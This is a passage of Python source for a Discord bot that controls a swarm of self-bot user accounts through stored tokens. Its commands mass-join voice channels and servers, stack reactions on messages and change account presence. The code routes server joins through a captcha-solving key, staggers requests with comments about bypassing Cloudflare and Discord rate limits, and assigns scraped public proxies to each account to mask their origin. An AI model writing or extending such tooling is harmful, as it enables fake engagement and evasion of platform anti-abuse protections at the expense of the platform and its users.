    worker = AccountWorker(display_username, token, added_via_cmd=True)
    active_accounts[token] = worker
    await worker.start()
    save_config()
    
    await ctx.send(f"🟢 **Account Registered Successfully**: Added \`{display_username}\` (\`{token[:15]}...\`) and queued gateway connection!")


@master_bot.command(name="removeaccount", aliases=["Removeaccount"])
@is_bot_owner()
async def remove_account_cmd(ctx, username: str):
    target_token = None
    for token, worker in active_accounts.items():
        if worker.alias.lower() == username.lower():
            target_token = token
            await worker.stop()
            break
            
    if target_token:
        del active_accounts[target_token]
        save_config()
        await ctx.send(f"🔴 **Account Removed**: Successfully unregistered and disconnected \`{username}\`.")
    else:
        await ctx.send(f"❌ Account matching alias \`{username}\` was not found in the orchestrator registry.")


@master_bot.command(name="infoaccount")
@is_bot_owner()
async def info_account_cmd(ctx, username: str):
    worker = None
    for w in active_accounts.values():
        if w.alias.lower() == username.lower():
            worker = w
            break
            
    if not worker:
        await ctx.send(f"❌ Account \`{username}\` not found.")
        return
        
    embed = discord.Embed(
        title=f"👤 Account Statistics: {worker.alias}",
        color=0x3498db
    )
    embed.add_field(name="Proxy Connection", value=f"\`{worker.proxy or 'None (Direct IP)'}\`", inline=True)
    embed.add_field(name="Gateway Presence", value=f"\`{worker.status.upper()}\`", inline=True)
    embed.add_field(name="User ID", value=f"\`{worker.user_id or 'Resolving...'}\`", inline=True)
    embed.add_field(name="Active VC Connection", value=f"\`{worker.voice_channel_id or 'None'}\`", inline=True)
    embed.add_field(name="Assigned User-Agent", value=f"\`{worker.user_agent[:40]}...\`", inline=False)
    
    await ctx.send(embed=embed)


@master_bot.command(name="accounts", aliases=["Accounts", "listaccounts"])
@is_bot_owner()
async def accounts_list_cmd(ctx):
    if not active_accounts:
        await ctx.send("❌ No self-bot accounts registered in active pool.")
        return
    
    lines = []
    for idx, worker in enumerate(active_accounts.values(), 1):
        lines.append(f"{idx}. \`{worker.alias}\` ({worker.status.upper()}) — ID: \`{worker.user_id or 'Resolving...'}\`")
        
    embed = discord.Embed(
        title="👥 Registered Self-Bot Accounts",
        description="\\n".join(lines),
        color=0x2ecc71
    )
    await ctx.send(embed=embed)


@master_bot.command(name="owners", aliases=["Owners", "listowners", "ownerlist"])
@is_bot_owner()
async def owners_list_cmd(ctx):
    current_owners = list(dict.fromkeys(DEFAULT_OWNER_IDS + owner_ids))
    try:
        with open("config.json", "r") as cf:
            cf_data = json.load(cf)
            for oid in cf_data.get("owner_ids", []):
                if str(oid).isdigit() and int(oid) not in current_owners:
                    current_owners.append(int(oid))
    except Exception:
        pass
    
    lines = []
    for oid in current_owners:
        tag = " 👑 *(You)*" if oid == ctx.author.id else ""
        lines.append(f"• <@{oid}> (\`{oid}\`){tag}")
        
    embed = discord.Embed(
        title="👑 Authorized Swarm Owners",
        description="\\n".join(lines) if lines else "No owners configured.",
        color=0xf1c40f
    )
    embed.set_footer(text=f"Total Owners: {len(current_owners)} | Use {bot_prefix}addowner <user_id> to add")
    await ctx.send(embed=embed)


@master_bot.command(name="addowner", aliases=["Addowner"])
@is_bot_owner()
async def add_owner_cmd(ctx, user_id_input: str):
    clean_id = re.sub(r"[<@!>]", "", user_id_input.strip())
    if not clean_id.isdigit():
        await ctx.send("❌ Please enter a valid numeric Discord User ID (e.g. \`!addowner 1546693679660539977\`).")
        return

    numeric_id = int(clean_id)
    if numeric_id not in owner_ids:
        owner_ids.append(numeric_id)

    try:
        with open("config.json", "r") as cf:
            cf_data = json.load(cf)
        cfg_owners = [str(x) for x in cf_data.get("owner_ids", [])]
        if clean_id not in cfg_owners:
            cfg_owners.append(clean_id)
            cf_data["owner_ids"] = cfg_owners
            with open("config.json", "w") as cf:
                json.dump(cf_data, cf, indent=4)
        await ctx.send(f"👑 **Owner Added**: Successfully granted Owner command access to <@{clean_id}> (\`{clean_id}\`).")
    except Exception as e:
        await ctx.send(f"✅ Added <@{clean_id}> to runtime owners (Config save warning: {e}).")


@master_bot.command(name="guild", aliases=["Guild", "server", "guildinfo", "botguild"])
@is_bot_owner()
async def guild_info_cmd(ctx):
    target_gid = config.get("guild_id", "1562129145788375090")
    guild = None
    if target_gid and str(target_gid).isdigit():
        guild = master_bot.get_guild(int(target_gid))
    
    embed = discord.Embed(
        title="🏰 Bot Primary Guild",
        color=0x5865F2
    )
    embed.add_field(name="Configured Guild ID", value=f"\`{target_gid}\`", inline=True)
    if guild:
        embed.add_field(name="Guild Name", value=f"**{guild.name}**", inline=True)
        embed.add_field(name="Members Count", value=f"\`{guild.member_count}\`", inline=True)
        embed.add_field(name="Channels Count", value=f"\`{len(guild.channels)}\`", inline=True)
        embed.add_field(name="Roles Count", value=f"\`{len(guild.roles)}\`", inline=True)
        embed.add_field(name="Guild Owner ID", value=f"<@{guild.owner_id}> (\`{guild.owner_id}\`)", inline=True)
    else:
        embed.add_field(name="Status", value="⚠️ Bot has registered this Guild ID in its configuration.", inline=False)
        bot_id = master_bot.user.id if master_bot.user else "1562009396631044117"
        embed.add_field(name="Bot Invite Link", value=f"[Click to Invite Master Bot](https://discord.com/oauth2/authorize?client_id={bot_id}&scope=bot%20applications.commands&permissions=8)", inline=False)
    await ctx.send(embed=embed)


@master_bot.command(name="setguild", aliases=["Setguild"])
@is_bot_owner()
async def set_guild_cmd(ctx, new_guild_id: str):
    clean_id = re.sub(r"[^\d]", "", new_guild_id.strip())
    if not clean_id:
        await ctx.send(f"❌ Please enter a valid numeric Guild ID (e.g. \`{bot_prefix}setguild 1562129145788375090\`).")
        return
    config["guild_id"] = clean_id
    save_config()
    guild = master_bot.get_guild(int(clean_id))
    name_str = f" (**{guild.name}**)" if guild else ""
    await ctx.send(f"🏰 **Primary Guild Updated**: Successfully set target guild ID to \`{clean_id}\`{name_str}.")


@master_bot.command(name="accountstatus", aliases=["Accountstatus", "statusaccount", "setstatus"])
@is_bot_owner()
async def account_status_cmd(ctx, username: str, status: str):
    worker = None
    for w in active_accounts.values():
        if w.alias.lower() == username.lower():
            worker = w
            break
            
    if not worker:
        await ctx.send(f"❌ Account \`{username}\` not found in registry.")
        return
        
    status = status.lower()
    if status not in ["online", "idle", "dnd", "offline"]:
        await ctx.send("❌ Invalid status. Choose from: \`online\`, \`idle\`, \`dnd\`, \`offline\`.")
        return
        
    await worker.update_status(status)
    save_config()
    
    await ctx.send(f"🟢 **Status Updated**: Changed presence of \`{worker.alias}\` to \`{status.upper()}\`.")


# Swarm Deployment Actions
@master_bot.command(name="joinvc")
@is_bot_owner()
async def joinvc(ctx, vc_link: str, quantity: int):
    guild_id, channel_id = parse_vc_link(vc_link)
    if not channel_id:
        await ctx.send("❌ Invalid Voice Channel format.")
        return

    # Select workers in current guild up to quantity
    workers, verified = await check_membership_and_get_workers(ctx, quantity)
    if not verified or not workers:
        return

    await ctx.send(f"🎙️ Ordering {len(workers)} accounts to connect to Voice Channel \`{channel_id}\`...")
    
    success_count = 0
    target_gid = guild_id or (str(ctx.guild.id) if ctx.guild else str(config.get("guild_id", "1562129145788375090")))
    for worker in workers:
        if await worker.join_vc(target_gid, channel_id):
            success_count += 1
        await asyncio.sleep(1.0) # Organic delay

    await ctx.send(f"✅ VC Command complete. {success_count} of {len(workers)} account(s) joined successfully.")


@master_bot.command(name="leavevc")
@is_bot_owner()
async def leavevc(ctx, vc_link: str, quantity: int):
    guild_id, channel_id = parse_vc_link(vc_link)
    workers = [w for w in active_accounts.values() if w.voice_channel_id == channel_id or w.voice_channel_id is not None][:quantity]
    
    if not workers:
        await ctx.send("❌ No workers are active in voice channels.")
        return
        
    await ctx.send(f"🚪 Disconnecting {len(workers)} accounts from Voice Channels...")
    success_count = 0
    for worker in workers:
        if await worker.leave_vc():
            success_count += 1
        await asyncio.sleep(0.5)
        
    await ctx.send(f"✅ Cleanup complete. {success_count} account(s) disconnected.")


@master_bot.command(name="vcmemberstatus", aliases=["vcstatus", "vcmember", "vcmemberstate", "Vcmemberstatus", "Vcstatus"])
@is_bot_owner()
async def vcmemberstatus(ctx, username: str, *, status_type: str):
    """
    Change voice channel status for self-bot tokens active in VC.
    Usage:
      !vcmemberstatus <username> <type>
    Examples:
      !vcmemberstatus shadow1 undefean
      !vcmemberstatus shadow1 deafen
      !vcmemberstatus shadow1 mute
      !vcmemberstatus shadow1 unmute
      !vcmemberstatus all undefean
    """
    clean_type = status_type.lower().strip()
    norm_type = clean_type.replace(" ", "").replace("-", "").replace("_", "")

    # Determine desired mute & deafen states
    target_mute = None
    target_deaf = None
    action_label = clean_type.title()

    if norm_type in ["undefean", "undeafen", "undeaf", "undef", "un-defean", "un-deafen", "nodeafen", "nodefean"]:
        target_deaf = False
        action_label = "Undeafened"
    elif norm_type in ["defean", "deafen", "deaf", "def"]:
        target_deaf = True
        action_label = "Deafened"
    elif norm_type in ["unmute", "unmut", "nomute"]:
        target_mute = False
        action_label = "Unmuted"
    elif norm_type in ["mute", "mut"]:
        target_mute = True
        action_label = "Muted"
    elif norm_type in ["unmuteundefean", "undefeanunmute", "unmuteundeafen", "undeafenunmute", "normal", "speak", "talk", "clear"]:
        target_deaf = False
        target_mute = False
        action_label = "Unmuted & Undeafened"
    elif norm_type in ["defeanmute", "mutedefean", "deafenmute", "mutedeafen"]:
        target_deaf = True
        target_mute = True
        action_label = "Muted & Deafened"
    else:
        # Check subwords
        is_undef = any(w in clean_type for w in ["undefean", "undeafen", "undeaf"])
        is_def = any(w in clean_type for w in ["defean", "deafen", "deaf"]) and not is_undef
        is_unmut = any(w in clean_type for w in ["unmute", "unmut"])
        is_mut = any(w in clean_type for w in ["mute", "mut"]) and not is_unmut

        if is_undef: target_deaf = False
        elif is_def: target_deaf = True

        if is_unmut: target_mute = False
        elif is_mut: target_mute = True

        if target_mute is None and target_deaf is None:
            await ctx.send(
                f"❌ Unknown status type \`{status_type}\`.\\n"
                f"Valid types: \`undefean\` (or \`undeafen\`), \`defean\` (or \`deafen\`), \`mute\`, \`unmute\`.\\n"
                f"Example: \`{bot_prefix}vcmemberstatus shadow1 undefean\`"
            )
            return
        action_label = f"Voice State ({clean_type})"

    # Find matching workers
    target_workers = []
    if username.lower() in ["all", "*", "every", "everyone"]:
        target_workers = list(active_accounts.values())
    else:
        clean_user = re.sub(r"[<@!>]", "", username.strip()).lower()
        for w in active_accounts.values():
            if (
                w.alias.lower() == clean_user
                or (w.user_id and str(w.user_id) == clean_user)
                or clean_user in w.alias.lower()
            ):
                target_workers.append(w)
                break

    if not target_workers:
        available = ", ".join([f"\`{w.alias}\`" for w in active_accounts.values()]) or "None"
        await ctx.send(f"❌ Account matching \`{username}\` not found in registered accounts pool.\\nRegistered accounts: {available}")
        return

    success_count = 0
    results_detail = []

    for worker in target_workers:
        # If worker has no guild_id or voice_channel_id set, try resolving from context
        if not worker.voice_channel_id and ctx.guild and worker.user_id:
            m = ctx.guild.get_member(worker.user_id)
            if m and m.voice and m.voice.channel:
                worker.voice_channel_id = str(m.voice.channel.id)
                worker.guild_id = str(ctx.guild.id)

        # Attempt Gateway Opcode 4 voice state update
        gateway_ok = await worker.set_vc_status(mute=target_mute, deaf=target_deaf)

        # Also attempt guild member edit if master bot has permissions in guild
        guild_perm_applied = False
        if ctx.guild and worker.user_id:
            try:
                mem = ctx.guild.get_member(worker.user_id) or await ctx.guild.fetch_member(worker.user_id)
                if mem and mem.voice:
                    edit_kwargs = {}
                    if target_deaf is False and mem.voice.deaf:
                        edit_kwargs["deafen"] = False
                    elif target_deaf is True and not mem.voice.deaf:
                        edit_kwargs["deafen"] = True

                    if target_mute is False and mem.voice.mute:
                        edit_kwargs["mute"] = False
                    elif target_mute is True and not mem.voice.mute:
                        edit_kwargs["mute"] = True

                    if edit_kwargs and ctx.guild.me.guild_permissions.deafen_members and ctx.guild.me.guild_permissions.mute_members:
                        await mem.edit(**edit_kwargs)
                        guild_perm_applied = True
            except Exception as e:
                log_info(f"Guild voice edit note for {worker.alias}: {e}")

        if gateway_ok or guild_perm_applied:
            success_count += 1
            st_str = []
            st_str.append("🟢 Undeafened" if not worker.self_deaf else "🔴 Deafened")
            st_str.append("🟢 Unmuted" if not worker.self_mute else "🔴 Muted")
            results_detail.append(f"• **\`{worker.alias}\`**: {', '.join(st_str)}")
        else:
            # If token wasn't in VC or connection failed
            results_detail.append(f"• **\`{worker.alias}\`**: ⚠️ Not currently in a voice channel or Gateway socket closed")

    embed = discord.Embed(
        title="🎙️ VC Member Status Modified",
        description=f"Action: **{action_label}**\\nExecuted by: {ctx.author.mention}",
        color=0x2ecc71 if ("un" in clean_type or success_count > 0) else 0xe67e22
    )
    embed.add_field(
        name=f"Results ({success_count}/{len(target_workers)} applied)",
        value="\\n".join(results_detail)[:1024] if results_detail else "No workers updated.",
        inline=False
    )
    embed.set_footer(text=f"Master Bot Guild ID: {config.get('guild_id', '1562129145788375090')} | Tip: {bot_prefix}vcmemberstatus shadow1 undefean")
    await ctx.send(embed=embed)


@master_bot.command(name="react")
@is_bot_owner()
async def react(ctx, msg_link: str, emoji: str, quantity: int):
    channel_id, message_id = parse_message_link(msg_link)
    if not channel_id or not message_id:
        await ctx.send("❌ Invalid message URL.")
        return
        
    workers, verified = await check_membership_and_get_workers(ctx, quantity)
    if not verified or not workers:
        return
        
    await ctx.send(f"🎭 Dispatched reaction swarm ({emoji}) using {len(workers)} accounts...")
    
    success = 0
    for worker in workers:
        ok = await worker.react(channel_id, message_id, emoji)
        if ok:
            success += 1
        # Random sleep between 0.8 and 1.8 seconds to completely safeguard accounts from discord spam limits
        await asyncio.sleep(random.uniform(0.8, 1.8))
        
    await ctx.send(f"✅ Dispatch complete. placed {success}/{len(workers)} reactions.")


@master_bot.command(name="removereact")
@is_bot_owner()
async def removereact(ctx, msg_link: str, emoji: str, quantity: int):
    channel_id, message_id = parse_message_link(msg_link)
    if not channel_id or not message_id:
        await ctx.send("❌ Invalid message link.")
        return
        
    workers, verified = await check_membership_and_get_workers(ctx, quantity)
    if not verified or not workers:
        return
        
    success = 0
    for worker in workers:
        ok = await worker.remove_react(channel_id, message_id, emoji)
        if ok:
            success += 1
        await asyncio.sleep(0.5)
        
    await ctx.send(f"🧹 Removed {success} reactions.")


@master_bot.command(name="joinserver")
@is_bot_owner()
async def joinserver(ctx, server_link: str, quantity: int):
    invite_code = parse_invite_link(server_link)
    workers = [w for w in active_accounts.values() if w.status != "off" and getattr(w, "added_via_cmd", False)][:quantity]
    
    if not workers:
        await ctx.send("❌ No active accounts available.")
        return
        
    nope_key = config.get("nope_captcha_key")
    await ctx.send(f"🌐 Initiating secure server join swarm for {len(workers)} accounts using invite code \`{invite_code}\`...")
    
    success_count = 0
    failures = []
    for index, worker in enumerate(workers):
        # High security protection: staggered join times to bypass cloudflare/discord rate limiting
        # 10 to 25 second random intervals
        stagger_time = random.uniform(10.0, 25.0) if index > 0 else 0.5
        if index > 0:
            log_info(f"Sleeping for {stagger_time:.2f}s before launching join request for {worker.alias}...")
            await asyncio.sleep(stagger_time)
            
        success = await worker.join_server(invite_code, nope_key)
        if success:
            success_count += 1
        else:
            err = getattr(worker, 'last_join_error', 'Unknown error')
            failures.append(f"• **{worker.alias}**: {err}")
        
    embed = discord.Embed(
        title="🌐 Server Join Swarm Complete",
        description=f"Status for joining \`{invite_code}\`:",
        color=0x2ecc71 if success_count == len(workers) else 0xe74c3c
    )
    embed.add_field(name="Joined Successfully", value=f"🟢 **{success_count} / {len(workers)}** accounts", inline=False)
    if failures:
        embed.add_field(name="Failed Accounts Details", value="\\n".join(failures)[:1024], inline=False)
    await ctx.send(embed=embed)


# ==========================================
# CATEGORY: PROXY UTILITIES AND COMMANDS
# ==========================================

def format_proxy_url(raw_proxy):
    raw_proxy = raw_proxy.strip()
    if not raw_proxy:
        return None
    if raw_proxy.startswith("http://") or raw_proxy.startswith("https://") or raw_proxy.startswith("socks5://") or raw_proxy.startswith("socks4://"):
        return raw_proxy
        
    if "@" in raw_proxy:
        return f"http://{raw_proxy}"
        
    parts = raw_proxy.split(":")
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    elif len(parts) == 4:
        host, port, user, pass_ = parts
        return f"http://{user}:{pass_}@{host}:{port}"
    elif len(parts) == 3:
        return f"http://{raw_proxy}"
        
    return f"http://{raw_proxy}"


async def fetch_public_proxies():
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-saver/master/proxies.txt"
    ]
    proxies = []
    timeout = aiohttp.ClientTimeout(total=8)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for url in sources:
            try:
                async with session.get(url) as response:
                    if response.status == 200:
                        text = await response.text()
                        for line in text.splitlines():
                            line = line.strip()
                            if line and ":" in line and not line.startswith("#"):
                                proxies.append(line)
            except Exception:
                pass
    return list(set(proxies))


async def test_single_proxy(session, raw_ip_port):
    formatted = format_proxy_url(raw_ip_port)
    if not formatted:
        return None, None
    import time
    start_time = time.time()
    try:
        # Use lightweight Google generate_204 HTTP endpoint instead of HTTPS to avoid SSL handshake issues on free proxies, and support any successful connection/redirect (200, 204, 301, 302)
        async with session.get("http://clients3.google.com/generate_204", proxy=formatted, timeout=4) as response:
            if response.status in (200, 204, 301, 302):
                latency = round((time.time() - start_time) * 1000, 2)
                return formatted, latency
    except Exception:
        pass
    return None, None


async def get_working_public_proxies(amount: int):
    raw_list = await fetch_public_proxies()
    import random
    random.shuffle(raw_list)
    
    # Increase the tested candidates and concurrency to guarantee finding highly responsive active proxies
    candidates = raw_list[:max(600, amount * 15)]
    working = []
    
    timeout = aiohttp.ClientTimeout(total=5)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        sem = asyncio.Semaphore(150)
        
        async def worker(proxy):
            async with sem:
                formatted, latency = await test_single_proxy(session, proxy)
                if formatted:
                    working.append((formatted, latency))
                    
        tasks = [worker(p) for p in candidates]
        await asyncio.gather(*tasks, return_exceptions=True)
        
    working.sort(key=lambda x: x[1])
    return working[:amount]


@master_bot.command(name="addaccountproxies", aliases=["addaccountproxy", "autoaccountproxies", "setaccountproxies"])
@is_bot_owner()
async def add_account_proxies_cmd(ctx):
    if not active_accounts:
        await ctx.send("❌ No self-bot accounts registered in the active pool.")
        return
        
    status_msg = await ctx.send("📡 **Fetching, speed-testing, and filtering the fastest active public proxies...**")
    
    import time
    try:
        qty_needed = len(active_accounts)
        working_proxies = await get_working_public_proxies(qty_needed)
    except Exception as e:
        await status_msg.edit(content=f"❌ Failed to fetch public proxies: {e}")
        return
        
    if not working_proxies:
        await status_msg.edit(content="❌ Could not retrieve any working public proxies at this moment. Please try again later.")
        return
        
    assigned_details = []
    # Assign each proxy to an active account
    for idx, (token, worker) in enumerate(active_accounts.items()):
        if idx >= len(working_proxies):
            assigned_details.append(f"• \`{worker.alias}\` ➜ ⚠️ No proxy available (pool exhausted)")
            continue
            
        proxy_url, latency = working_proxies[idx]
        
        # Stop the worker first
        await worker.stop()
        
        # Assign the proxy
        worker.proxy = proxy_url
        
        # Start the worker back up with the new proxy
        await worker.start()
        
        masked_url = proxy_url.replace("http://", "")
        if "@" in masked_url:
            p_parts = masked_url.split("@")
            masked_url = f"***:***@{p_parts[1]}"
            
        assigned_details.append(f"• \`{worker.alias}\` ➜ \`🟢 {masked_url}\` (Latency: \`{latency}ms\`)")
        
    # Save the config so it persists across restarts
    save_config()
    
    embed = discord.Embed(
        title="🔌 Account Proxy Allocation",
        description="Successfully fetched separate high-quality verified proxies and allocated them to your accounts.",
        color=0x2ecc71
    )
    embed.add_field(name="Proxy Allocation Results", value="\\n".join(assigned_details), inline=False)
    embed.set_footer(text=f"Total Accounts Configured: {len(active_accounts)} | All gateways reconnected safely.")
    
    await status_msg.delete()
    await ctx.send(embed=embed)


@master_bot.command(name="addproxies", aliases=["addproxy", "Addproxies"])
@is_bot_owner()
async def add_proxies_cmd(ctx, amount: int, *, type_str: str = "non-verified"):
    import time
    if amount < 1 or amount > 10:
        embed = discord.Embed(
            title="🔌 Add Proxies Limit",
            description="❌ You can only add between **1** and **10** proxies at a time.\\n\\nPlease specify an amount from **1** to **10** (e.g. \`!addproxies 5\`).",
            color=0xff3333
        )
        await ctx.send(embed=embed)
        return

    type_str = type_str.lower().strip()
    if "non" in type_str or "un" in type_str:
        proxy_type = "non-verified"
    elif "dead" in type_str:
        proxy_type = "dead"
    else:
        proxy_type = "verified"

    raw_proxies = []
    
    for attachment in ctx.message.attachments:
        if attachment.filename.endswith(".txt"):
            try:
                content = await attachment.read()
                text = content.decode("utf-8")
                raw_proxies.extend(text.splitlines())
            except Exception as e:
                log_error(f"Failed to read attachment: {e}")
                
    content_lines = ctx.message.content.splitlines()
    if len(content_lines) > 1:
        raw_proxies.extend(content_lines[1:])
    else:
        parts = ctx.message.content.split()
        for part in parts:
            if ":" in part and not part.startswith("!"):
                raw_proxies.append(part)

    parsed_proxies = []
    for raw in raw_proxies:
        raw = raw.strip()
        if not raw:
            continue
        formatted = format_proxy_url(raw)
        if formatted:
            parsed_proxies.append(formatted)

    if not parsed_proxies:
        status_msg = await ctx.send("📡 **No manual proxies found. Automatically fetching, speed-testing, and filtering the fastest working proxies for you...**")
        
        try:
            working_proxies = await get_working_public_proxies(amount)
        except Exception as e:
            await status_msg.edit(content=f"❌ Failed to fetch public proxies: {e}")
            return
            
        if not working_proxies:
            await status_msg.edit(content="❌ Could not retrieve any responsive public proxies at this moment. Please try again later or paste custom proxies.")
            return
            
        if "proxies" not in config:
            config["proxies"] = []
            
        existing_urls = {p["url"] for p in config["proxies"]}
        added_count = 0
        added_details = []
        
        for url, latency in working_proxies:
            if url not in existing_urls:
                config["proxies"].append({
                    "url": url,
                    "type": "verified",
                    "last_checked": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "latency": latency
                })
                existing_urls.add(url)
                added_count += 1
                
                masked_url = url.replace("http://", "")
                if "@" in masked_url:
                    p_parts = masked_url.split("@")
                    masked_url = f"***:***@{p_parts[1]}"
                added_details.append(f"• \`🟢\` \`{masked_url}\` | Latency: \`{latency}ms\`")

        save_config()
        
        embed = discord.Embed(
            title="🔌 Automatic Proxies Loaded",
            description=f"Successfully fetched, validated, and added **{added_count}** new high-quality proxies to the pool as **VERIFIED**.",
            color=0x2ecc71
        )
        if added_details:
            embed.add_field(name="⚡ Top Verified Proxies Added", value="\\n".join(added_details[:15]), inline=False)
        embed.add_field(name="Total Pool Size", value=f"\`{len(config.get('proxies', []))}\` proxies", inline=True)
        embed.add_field(name="Quality Status", value="\`EXCELLENT (Tested)\`", inline=True)
        
        await status_msg.delete()
        await ctx.send(embed=embed)
        return

    to_add = parsed_proxies[:amount]
    
    if "proxies" not in config:
        config["proxies"] = []
        
    existing_urls = {p["url"] for p in config["proxies"]}
    added_count = 0
    
    for url in to_add:
        if url not in existing_urls:
            config["proxies"].append({
                "url": url,
                "type": proxy_type,
                "last_checked": "Never",
                "latency": None
            })
            existing_urls.add(url)
            added_count += 1

    save_config()
    
    embed = discord.Embed(
        title="🔌 Proxies Added",
        description=f"Successfully processed **{len(to_add)}** proxies and added **{added_count}** new ones to the pool as **{proxy_type.upper()}**.",
        color=0x2ecc71
    )
    embed.add_field(name="Total Pool Size", value=f"\`{len(config.get('proxies', []))}\` proxies", inline=True)
    embed.add_field(name="Target Type", value=f"\`{proxy_type.upper()}\`", inline=True)
    await ctx.send(embed=embed)


@master_bot.command(name="removeproxies", aliases=["removeproxy", "deleteproxies", "delproxies"])
@is_bot_owner()
async def remove_proxies_cmd(ctx, type_str: str):
    type_str = type_str.lower().strip()
    
    if "proxies" not in config or not config["proxies"]:
        embed = discord.Embed(
            title="🔌 Remove Proxies",
            description="The proxy pool is already empty.",
            color=0xffcc00
        )
        await ctx.send(embed=embed)
        return
        
    target_type = None
    if type_str in ["verify", "verified"]:
        target_type = "verified"
    elif type_str in ["dead", "offline", "failed"]:
        target_type = "dead"
    elif type_str in ["nonverify", "non-verify", "nonverified", "non-verified"]:
        target_type = "non-verified"
    elif type_str == "all":
        target_type = "all"
        
    if not target_type:
        embed = discord.Embed(
            title="🔌 Remove Proxies",
            description=(
                "❌ Invalid proxy type. Please specify one of the following:\\n"
                "• \`verify\` or \`verified\`\\n"
                "• \`dead\`\\n"
                "• \`nonverify\` or \`non-verified\`\\n"
                "• \`all\`"
            ),
            color=0xff3333
        )
        await ctx.send(embed=embed)
        return

    original_count = len(config["proxies"])
    if target_type == "all":
        config["proxies"] = []
    else:
        config["proxies"] = [p for p in config["proxies"] if p.get("type", "non-verified") != target_type]
        
    removed_count = original_count - len(config["proxies"])
    save_config()
    
    embed = discord.Embed(
        title="🔌 Proxies Removed",
        description=f"Successfully removed **{removed_count}** proxies of type **{target_type.upper()}**.",
        color=0xe74c3c
    )
    embed.add_field(name="Remaining Pool Size", value=f"\`{len(config['proxies'])}\` proxies", inline=True)
    await ctx.send(embed=embed)


@master_bot.command(name="checkproxies", aliases=["checkproxy", "chekproxies", "chekproxy"])
@is_bot_owner()
async def check_proxies_cmd(ctx, target: str = "all"):
    if "proxies" not in config or not config["proxies"]:
        embed = discord.Embed(
            title="🔌 Check Proxies",
            description="There are no proxies in the pool to check. Use \`!addproxies\` first.",
            color=0xffcc00
        )
        await ctx.send(embed=embed)
        return

    status_msg = await ctx.send("⏳ **Starting proxy check... testing latency and connectivity to Discord/Web services.**")
    
    import time
    
    proxies_to_check = config["proxies"]
    total = len(proxies_to_check)
    verified_count = 0
    dead_count = 0
    
    async def test_one_proxy(proxy_item):
        nonlocal verified_count, dead_count
        url = proxy_item["url"]
        start_time = time.time()
        try:
            test_url = "https://discord.com/api/v9/gateway"
            timeout = aiohttp.ClientTimeout(total=5)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(test_url, proxy=url) as response:
                    latency = round((time.time() - start_time) * 1000, 2)
                    if response.status == 200:
                        proxy_item["type"] = "verified"
                        proxy_item["latency"] = latency
                        proxy_item["last_checked"] = time.strftime("%Y-%m-%d %H:%M:%S")
                        verified_count += 1
                        return
        except Exception:
            pass
            
        try:
            backup_url = "https://www.google.com"
            timeout = aiohttp.ClientTimeout(total=4)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(backup_url, proxy=url) as response:
                    latency = round((time.time() - start_time) * 1000, 2)
                    if response.status == 200:
                        proxy_item["type"] = "verified"
                        proxy_item["latency"] = latency
                        proxy_item["last_checked"] = time.strftime("%Y-%m-%d %H:%M:%S")
                        verified_count += 1
                        return
        except Exception:
            pass

        proxy_item["type"] = "dead"
        proxy_item["latency"] = None
        proxy_item["last_checked"] = time.strftime("%Y-%m-%d %H:%M:%S")
        dead_count += 1

    sem = asyncio.Semaphore(50)
    
    async def sem_check(p):
        async with sem:
            await test_one_proxy(p)
            
    tasks = [sem_check(p) for p in proxies_to_check]
    await asyncio.gather(*tasks)
    
    save_config()
    
    embed = discord.Embed(
        title="🔌 Proxy Check Completed",
        description=f"Finished checking all **{total}** proxies in your pool.",
        color=0x3498db
    )
    embed.add_field(name="✅ Verified (Working)", value=f"**{verified_count}** proxies", inline=True)
    embed.add_field(name="❌ Dead (Failed)", value=f"**{dead_count}** proxies", inline=True)
    
    working_proxies = [p for p in config["proxies"] if p.get("type") == "verified"]
    working_proxies.sort(key=lambda x: x.get("latency", 999999))
    
    if working_proxies:
        top_list = []
        for p in working_proxies[:5]:
            masked_url = p['url'].replace("http://", "")
            if "@" in masked_url:
                parts = masked_url.split("@")
                masked_url = f"***:***@{parts[1]}"
            top_list.append(f"• \`{masked_url}\` | Latency: \`{p['latency']}ms\`")
        embed.add_field(name="⚡ Fastest Working Proxies", value="\\n".join(top_list), inline=False)
        
    await status_msg.delete()
    await ctx.send(embed=embed)


@master_bot.command(name="allproxies", aliases=["allproxy", "listproxies", "listproxy"])
@is_bot_owner()
async def all_proxies_cmd(ctx):
    if "proxies" not in config or not config["proxies"]:
        embed = discord.Embed(
            title="🔌 Proxy Pool Registry",
            description="The proxy pool is currently empty. Use \`!addproxies\` to add proxies.",
            color=0xffcc00
        )
        await ctx.send(embed=embed)
        return

    proxies = config["proxies"]
    total = len(proxies)
    
    verified = [p for p in proxies if p.get("type") == "verified"]
    dead = [p for p in proxies if p.get("type") == "dead"]
    non_verified = [p for p in proxies if p.get("type") == "non-verified"]
    
    embed = discord.Embed(
        title="🔌 Proxy Pool Registry",
        description=f"Showing all registered proxies in the pool (Total: **{total}**).",
        color=0x3498db
    )
    
    embed.add_field(name="🟢 Verified (Active)", value=f"\`{len(verified)}\` proxies", inline=True)
    embed.add_field(name="🔴 Dead (Failed)", value=f"\`{len(dead)}\` proxies", inline=True)
    embed.add_field(name="⚪ Unverified / New (Inactive)", value=f"\`{len(non_verified)}\` proxies", inline=True)

    shown_proxies = proxies[:15]
    proxy_lines = []
    for i, p in enumerate(shown_proxies, 1):
        status_emoji = "🟢" if p.get("type") == "verified" else "🔴" if p.get("type") == "dead" else "⚪"
        masked_url = p['url'].replace("http://", "")
        if "@" in masked_url:
            parts = masked_url.split("@")
            masked_url = f"***:***@{parts[1]}"
        latency_str = f" (\`{p.get('latency')}ms\`)" if p.get("latency") else ""
        proxy_lines.append(f"{i}. {status_emoji} \`{masked_url}\`{latency_str} - {p.get('type', 'non-verified').upper()}")

    if total > 15:
        proxy_lines.append(f"*... and {total - 15} more proxies in the pool.*")

    embed.add_field(
        name="📄 Registered Proxies List",
